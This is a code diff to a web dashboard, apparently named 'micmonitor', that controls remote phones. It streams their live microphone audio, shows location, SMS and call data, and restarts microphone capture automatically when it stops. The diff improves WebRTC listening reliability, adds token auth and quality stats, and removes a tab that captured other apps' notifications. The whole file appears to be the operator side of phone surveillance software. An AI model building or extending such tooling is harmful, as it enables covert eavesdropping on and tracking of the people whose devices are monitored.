@@ -68,6 +68,10 @@
       .health-item { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 6px 8px; }
       .health-label { color: var(--text3); font-size: 9px; text-transform: uppercase; letter-spacing: .07em; }
       .health-val { color: var(--text); font-size: 11px; font-family: var(--mono); margin-top: 2px; }
+      .br-badge { display: inline-block; min-width: 46px; text-align: center; border-radius: 999px; padding: 1px 8px; font-size: 10px; font-weight: 700; letter-spacing: .03em; border: 1px solid transparent; }
+      .br-low { color: #fecaca; background: rgba(239,68,68,.16); border-color: rgba(239,68,68,.35); }
+      .br-mid { color: #fde68a; background: rgba(245,158,11,.16); border-color: rgba(245,158,11,.35); }
+      .br-high { color: #86efac; background: rgba(34,197,94,.16); border-color: rgba(34,197,94,.35); }
       .ok-text { color: var(--green); }
       .bad-text { color: var(--red); }
 
@@ -185,13 +189,23 @@
     <script>
       const _wsProto = location.protocol === "https:" ? "wss" : "ws";
       const _wsHost = location.port ? `${location.hostname}:${location.port}` : location.hostname;
-      const WS_CONTROL_URL = `${_wsProto}://${_wsHost}/control`;
+      const _urlParams = new URLSearchParams(location.search);
+      const WS_AUTH_TOKEN = _urlParams.get("token") || localStorage.getItem("micmonitor_token") || "";
+      let webRtcConfig = {
+        iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }],
+        tokenRequired: false,
+      };
+
+      function buildControlWsUrl() {
+        const qs = WS_AUTH_TOKEN ? `?token=${encodeURIComponent(WS_AUTH_TOKEN)}` : "";
+        return `${_wsProto}://${_wsHost}/control${qs}`;
+      }
 
       let controlWs = null;
       const deviceState = {};
 
       function connectControlWs() {
-        controlWs = new WebSocket(WS_CONTROL_URL);
+        controlWs = new WebSocket(buildControlWsUrl());
         controlWs.binaryType = "arraybuffer";
         controlWs.onopen = () => { setWsStatus(true); log("Connected to server", "ok"); };
         controlWs.onclose = () => {
@@ -221,10 +235,9 @@
           case "recording_saved":    log(`💾 Device saved: ${msg.filename}`, "info"); refreshRecordingsList(); break;
           case "ack":                log(`ACK ${msg.deviceId}: ${msg.message}`, "info"); break;
           case "device_data":        renderDeviceData(msg.deviceId, msg.data); break;
-          case "notification":       appendNotification(msg.deviceId, msg); break;
           case "webrtc_answer":      onWebRtcAnswer(msg.deviceId, msg.sdp); break;
           case "webrtc_ice":         onWebRtcIce(msg.deviceId, msg.candidate); break;
-          case "webrtc_state":       renderWebRtcState(msg.deviceId, msg.state, msg.bitrateKbps); log(`WebRTC ${msg.deviceId}: ${msg.state || "state"}${msg.bitrateKbps ? ` (${msg.bitrateKbps} kbps)` : ""}`, "info"); break;
+          case "webrtc_state":       renderWebRtcState(msg.deviceId, msg.state, msg.bitrateKbps, msg.quality || null); log(`WebRTC ${msg.deviceId}: ${msg.state || "state"}${msg.bitrateKbps ? ` (${msg.bitrateKbps} kbps)` : ""}`, "info"); break;
           case "error":              log(`Error: ${msg.message}`, "err"); break;
         }
       }
@@ -271,6 +284,7 @@
             <div class="health-item"><div class="health-label">Last Health</div><div class="health-val" id="hhb_${deviceId}">-</div></div>
             <div class="health-item"><div class="health-label">WebRTC</div><div class="health-val" id="hrtc_${deviceId}">idle</div></div>
             <div class="health-item"><div class="health-label">Bitrate</div><div class="health-val" id="hbr_${deviceId}">-</div></div>
+            <div class="health-item"><div class="health-label">Quality</div><div class="health-val" id="hq_${deviceId}">-</div></div>
           </div>
           <div class="canvas-wrap">
             <span class="canvas-label">AUDIO</span>
@@ -290,12 +304,10 @@
             <button class="tab-btn active" onclick="openTab('${deviceId}','location',this)">📍 Location</button>
             <button class="tab-btn"        onclick="openTab('${deviceId}','sms',this)">💬 SMS</button>
             <button class="tab-btn"        onclick="openTab('${deviceId}','calls',this)">📞 Calls</button>
-            <button class="tab-btn"        onclick="openTab('${deviceId}','notifs',this)">🔔 Notifs</button>
           </div>
           <div class="tab-panel active" id="tab_${deviceId}_location"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
           <div class="tab-panel"        id="tab_${deviceId}_sms"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
-          <div class="tab-panel"        id="tab_${deviceId}_calls"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
-          <div class="tab-panel"        id="tab_${deviceId}_notifs"><div class="data-row"><span class="data-label">No notifications yet…</span></div></div>`;
+          <div class="tab-panel"        id="tab_${deviceId}_calls"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>`;
         document.getElementById("devicesContainer").appendChild(card);
         deviceState[deviceId] = {
           isLive: false,
@@ -305,10 +317,13 @@
           useWebRtc: false,
           rtcConnected: false,
           rtcPeer: null,
+          rtcRetryCount: 0,
+          rtcRestartTimer: null,
+          rtcStatsTimer: null,
           remoteAudioEl: null,
           lastRecoverTryAt: 0,
           canvas: document.getElementById(`canvas_${deviceId}`),
-          health: health || { wsConnected: true, micCapturing: false, lastAudioChunkAt: 0, lastHealthAt: 0, reason: "init", webRtcState: "idle", bitrateKbps: null },
+          health: health || { wsConnected: true, micCapturing: false, lastAudioChunkAt: 0, lastHealthAt: 0, reason: "init", webRtcState: "idle", bitrateKbps: null, quality: null },
         };
         renderDeviceHealth(deviceId, deviceState[deviceId].health);
       }
@@ -337,6 +352,7 @@
         const hb = document.getElementById(`hhb_${deviceId}`);
         const rtc = document.getElementById(`hrtc_${deviceId}`);
         const br = document.getElementById(`hbr_${deviceId}`);
+        const q = document.getElementById(`hq_${deviceId}`);
         if (ws) ws.innerHTML = h.wsConnected ? `<span class="ok-text">connected</span>` : `<span class="bad-text">disconnected</span>`;
         if (mic) mic.innerHTML = h.micCapturing ? `<span class="ok-text">running</span>` : `<span class="bad-text">stopped</span>`;
         if (aud) aud.textContent = h.lastAudioChunkAt ? formatAgo(h.lastAudioChunkAt) : "never";
@@ -346,7 +362,8 @@
           const isGood = /connected|started|answer_sent|bitrate/.test(st);
           rtc.innerHTML = isGood ? `<span class="ok-text">${st}</span>` : st;
         }
-        if (br) br.textContent = h.bitrateKbps ? `${h.bitrateKbps} kbps` : "-";
+        if (br) br.innerHTML = renderBitrateBadge(h.bitrateKbps);
+        if (q) q.textContent = renderQualitySummary(h.quality);
 
         // Auto-recover if user is in live mode but device mic stopped.
         if (state.isLive && h.wsConnected && !h.micCapturing) {
@@ -395,7 +412,7 @@
           controlWs.send(JSON.stringify({ cmd, deviceId, ...(extra || {}) }));
       }
 
-      function toggleLive(deviceId) {
+      async function toggleLive(deviceId) {
         const state = deviceState[deviceId];
         if (!state) return;
         const btn = document.getElementById(`btnLive_${deviceId}`);
@@ -413,9 +430,13 @@
           if (state.audioCtx.state === "suspended") state.audioCtx.resume();
           state.nextPlayTime = state.audioCtx.currentTime;
           btn.textContent = "⏸ Stop Listen"; btn.classList.add("active");
-          // Force device to (re)start streaming in case mic was not active
-          sendCmd(deviceId, "start_stream");
-          log(`Started live listen for ${deviceId}`, "ok");
+          const ok = await startWebRtc(deviceId, state);
+          if (!ok) {
+            sendCmd(deviceId, "start_stream");
+            log(`WebRTC unavailable for ${deviceId} — using PCM fallback`, "warn");
+          } else {
+            log(`Started live listen for ${deviceId} (WebRTC)`, "ok");
+          }
         }
       }
 
@@ -425,13 +446,32 @@
       function pingDevice(deviceId)   { sendCmd(deviceId, "ping"); log(`Pinged ${deviceId}`, "info"); }
       function refreshData(deviceId)  { sendCmd(deviceId, "get_data"); log(`Data refresh requested for ${deviceId}`, "info"); }
 
-      function renderWebRtcState(deviceId, state, bitrateKbps) {
+      function renderWebRtcState(deviceId, state, bitrateKbps, quality) {
         if (!deviceState[deviceId]) addDeviceCard(deviceId, "Unknown", null);
         const st = deviceState[deviceId];
         st.health = st.health || {};
         st.health.webRtcState = state || st.health.webRtcState || "state";
         if (Number.isFinite(Number(bitrateKbps))) st.health.bitrateKbps = Number(bitrateKbps);
+        if (quality && typeof quality === "object") st.health.quality = quality;
+        if (String(state || "").includes("need_reoffer")) {
+          scheduleIceRecovery(deviceId, st, "device_requested");
+        }
         renderDeviceHealth(deviceId, st.health);
+      }
+
+      function renderBitrateBadge(bitrateKbps) {
+        const b = Number(bitrateKbps);
+        if (!Number.isFinite(b) || b <= 0) return "-";
+        const cls = b <= 12 ? "br-low" : (b <= 24 ? "br-mid" : "br-high");
+        return `<span class="br-badge ${cls}">${Math.round(b)} kbps</span>`;
+      }
+
+      function renderQualitySummary(quality) {
+        if (!quality) return "-";
+        const rtt = Number.isFinite(Number(quality.rttMs)) ? `${Math.round(Number(quality.rttMs))}ms` : "-";
+        const loss = Number.isFinite(Number(quality.lossPct)) ? `${Number(quality.lossPct).toFixed(1)}%` : "-";
+        const jitter = Number.isFinite(Number(quality.jitterMs)) ? `${Math.round(Number(quality.jitterMs))}ms` : "-";
+        return `rtt ${rtt} | loss ${loss} | jit ${jitter}`;
       }
 
       async function toggleWebRtc(deviceId) {
@@ -443,13 +483,20 @@
 
       async function startWebRtc(deviceId, state) {
         if (state.rtcPeer) stopWebRtc(deviceId, false);
-        const pc = new RTCPeerConnection({
-          iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
-        });
+        let pc;
+        try {
+          pc = new RTCPeerConnection({
+            iceServers: webRtcConfig.iceServers,
+          });
+        } catch (e) {
+          log(`WebRTC init failed for ${deviceId}: ${e.message}`, "err");
+          return false;
+        }
         state.rtcPeer = pc;
         state.useWebRtc = true;
         state.rtcConnected = false;
         state.isLive = true;
+        state.rtcRetryCount = 0;
 
         if (!state.remoteAudioEl) {
           state.remoteAudioEl = document.createElement("audio");
@@ -460,6 +507,12 @@
         pc.ontrack = (evt) => {
           state.remoteAudioEl.srcObject = evt.streams[0];
           state.rtcConnected = true;
+          state.rtcRetryCount = 0;
+          if (state.rtcRestartTimer) {
+            clearTimeout(state.rtcRestartTimer);
+            state.rtcRestartTimer = null;
+          }
+          startStatsLoop(deviceId, state);
           log(`WebRTC track active for ${deviceId}`, "ok");
         };
 
@@ -470,22 +523,37 @@
 
         pc.oniceconnectionstatechange = () => {
           const s = pc.iceConnectionState;
-          if (s === "failed" || s === "disconnected" || s === "closed") state.rtcConnected = false;
+          if (s === "connected" || s === "completed") {
+            state.rtcConnected = true;
+            state.rtcRetryCount = 0;
+          }
+          if (s === "failed" || s === "disconnected") {
+            state.rtcConnected = false;
+            scheduleIceRecovery(deviceId, state, s);
+          }
+          if (s === "closed") state.rtcConnected = false;
           log(`WebRTC ICE ${deviceId}: ${s}`, s === "failed" ? "warn" : "info");
         };
 
         pc.addTransceiver("audio", { direction: "recvonly" });
-        const offer = await pc.createOffer();
-        await pc.setLocalDescription(offer);
+        try {
+          const offer = await pc.createOffer();
+          await pc.setLocalDescription(offer);
 
-        const btn = document.getElementById(`btnRtc_${deviceId}`);
-        if (btn) { btn.textContent = "⚡ WebRTC On"; btn.classList.add("active"); }
-        const liveBtn = document.getElementById(`btnLive_${deviceId}`);
-        if (liveBtn) { liveBtn.textContent = "⏸ Stop Listen"; liveBtn.classList.add("active"); }
+          const btn = document.getElementById(`btnRtc_${deviceId}`);
+          if (btn) { btn.textContent = "⚡ WebRTC On"; btn.classList.add("active"); }
+          const liveBtn = document.getElementById(`btnLive_${deviceId}`);
+          if (liveBtn) { liveBtn.textContent = "⏸ Stop Listen"; liveBtn.classList.add("active"); }
 
-        sendCmd(deviceId, "webrtc_start");
-        sendCmd(deviceId, "webrtc_offer", { sdp: offer.sdp });
-        log(`WebRTC offer sent to ${deviceId}`, "ok");
+          sendCmd(deviceId, "webrtc_start");
+          sendCmd(deviceId, "webrtc_offer", { sdp: offer.sdp });
+          log(`WebRTC offer sent to ${deviceId}`, "ok");
+          return true;
+        } catch (e) {
+          log(`WebRTC offer failed for ${deviceId}: ${e.message}`, "err");
+          stopWebRtc(deviceId, false);
+          return false;
+        }
       }
 
       function stopWebRtc(deviceId, notifyServer) {
@@ -496,6 +564,14 @@
           state.rtcPeer.onicecandidate = null;
           state.rtcPeer.oniceconnectionstatechange = null;
           state.rtcPeer.close();
+        }
+        if (state.rtcRestartTimer) {
+          clearTimeout(state.rtcRestartTimer);
+          state.rtcRestartTimer = null;
+        }
+        if (state.rtcStatsTimer) {
+          clearInterval(state.rtcStatsTimer);
+          state.rtcStatsTimer = null;
         }
         state.rtcPeer = null;
         state.useWebRtc = false;
@@ -527,8 +603,96 @@
         }
       }
 
+      function scheduleIceRecovery(deviceId, state, reason) {
+        if (!state || !state.rtcPeer || !state.useWebRtc) return;
+        if (state.rtcRestartTimer) clearTimeout(state.rtcRestartTimer);
+        if (state.rtcRetryCount >= 3) {
+          log(`WebRTC unstable for ${deviceId} (${reason}) — fallback to PCM`, "warn");
+          stopWebRtc(deviceId, true);
+          sendCmd(deviceId, "start_stream");
+          return;
+        }
+        const delayMs = 600 + state.rtcRetryCount * 700;
+        state.rtcRestartTimer = setTimeout(async () => {
+          if (!state.rtcPeer || !state.useWebRtc) return;
+          state.rtcRetryCount += 1;
+          try {
+            if (typeof state.rtcPeer.restartIce === "function") state.rtcPeer.restartIce();
+            const offer = await state.rtcPeer.createOffer({ iceRestart: true });
+            await state.rtcPeer.setLocalDescription(offer);
+            sendCmd(deviceId, "webrtc_offer", { sdp: offer.sdp });
+            log(`WebRTC ICE restart #${state.rtcRetryCount} sent for ${deviceId}`, "warn");
+          } catch (e) {
+            log(`WebRTC ICE restart failed for ${deviceId}: ${e.message}`, "err");
+          }
+        }, delayMs);
+      }
+
+      function startStatsLoop(deviceId, state) {
+        if (!state || !state.rtcPeer) return;
+        if (state.rtcStatsTimer) clearInterval(state.rtcStatsTimer);
+        state.rtcStatsTimer = setInterval(async () => {
+          if (!state.rtcPeer || !state.useWebRtc) return;
+          try {
+            const stats = await state.rtcPeer.getStats();
+            const quality = extractQualityFromStats(stats);
+            state.health = state.health || {};
+            state.health.quality = quality;
+            renderDeviceHealth(deviceId, state.health);
+            sendCmd(deviceId, "webrtc_quality", { quality });
+          } catch (_) {}
+        }, 3000);
+      }
+
+      function extractQualityFromStats(stats) {
+        let rttMs = null;
+        let jitterMs = null;
+        let packetsLost = null;
+        let packetsReceived = null;
+        stats.forEach((s) => {
+          if (s.type === "candidate-pair" && (s.nominated || s.selected) && Number.isFinite(Number(s.currentRoundTripTime))) {
+            rttMs = Number(s.currentRoundTripTime) * 1000;
+          }
+          if (s.type === "inbound-rtp" && s.kind === "audio") {
+            if (Number.isFinite(Number(s.jitter))) jitterMs = Number(s.jitter) * 1000;
+            if (Number.isFinite(Number(s.packetsLost))) packetsLost = Number(s.packetsLost);
+            if (Number.isFinite(Number(s.packetsReceived))) packetsReceived = Number(s.packetsReceived);
+          }
+        });
+        let lossPct = null;
+        if (packetsLost != null && packetsReceived != null) {
+          const total = packetsLost + packetsReceived;
+          if (total > 0) lossPct = (packetsLost * 100.0) / total;
+        }
+        return {
+          rttMs: rttMs != null ? Math.max(0, rttMs) : null,
+          jitterMs: jitterMs != null ? Math.max(0, jitterMs) : null,
+          lossPct: lossPct != null ? Math.max(0, lossPct) : null,
+        };
+      }
+
+      async function loadWebRtcConfig() {
+        try {
+          const qs = WS_AUTH_TOKEN ? `?token=${encodeURIComponent(WS_AUTH_TOKEN)}` : "";
+          const r = await fetch(`/api/webrtc-config${qs}`, { cache: "no-store" });
+          if (!r.ok) return;
+          const json = await r.json();
+          if (json && Array.isArray(json.iceServers) && json.iceServers.length > 0) {
+            webRtcConfig = {
+              iceServers: json.iceServers,
+              tokenRequired: !!json.tokenRequired,
+            };
+          }
+          if (webRtcConfig.tokenRequired && !WS_AUTH_TOKEN) {
+            log("Server requires token: open dashboard with ?token=YOUR_TOKEN", "warn");
+          }
+        } catch (e) {
+          log(`WebRTC config fetch failed: ${e.message}`, "warn");
+        }
+      }
+
       function openTab(deviceId, tab, btn) {
-        ["location","sms","calls","notifs"].forEach((t) => {
+        ["location","sms","calls"].forEach((t) => {
           const p = document.getElementById(`tab_${deviceId}_${t}`);
           if (p) p.classList.remove("active");
         });
@@ -536,25 +700,6 @@
         const panel = document.getElementById(`tab_${deviceId}_${tab}`);
         if (panel) panel.classList.add("active");
         if (btn) btn.classList.add("active");
-      }
-
-      function appendNotification(deviceId, n) {
-        // Auto-create card if notification arrives before device_connected
-        if (!deviceState[deviceId]) addDeviceCard(deviceId, "Unknown", null);
-        const panel = document.getElementById(`tab_${deviceId}_notifs`);
-        if (!panel) return;
-        const ph = panel.querySelector(".data-label");
-        if (ph && ph.textContent.includes("No notifications")) ph.parentElement.remove();
-        const entry = document.createElement("div");
-        entry.className = "data-row";
-        entry.innerHTML = `
-          <div><span class="data-val" style="font-weight:600">${escHtml(n.app||n.pkg)}</span>
-               <span class="data-label" style="float:right">${new Date(n.time).toLocaleTimeString()}</span></div>
-          ${n.title ? `<span class="data-val">${escHtml(n.title)}</span>` : ""}
-          ${n.text  ? `<span class="data-label">${escHtml(n.text)}</span>` : ""}`;
-        panel.insertBefore(entry, panel.firstChild);
-        while (panel.children.length > 100) panel.removeChild(panel.lastChild);
-        log(`🔔 ${n.app}: ${n.title || n.text}`, "info");
       }
 
       function renderDeviceData(deviceId, data) {
@@ -714,7 +859,7 @@
         Object.keys(deviceState).forEach((id) => renderDeviceHealth(id));
       }, 2000);
 
-      connectControlWs();
+      loadWebRtcConfig().finally(connectControlWs);
       refreshRecordingsList();
       setInterval(refreshRecordingsList, 10000);
     </script>
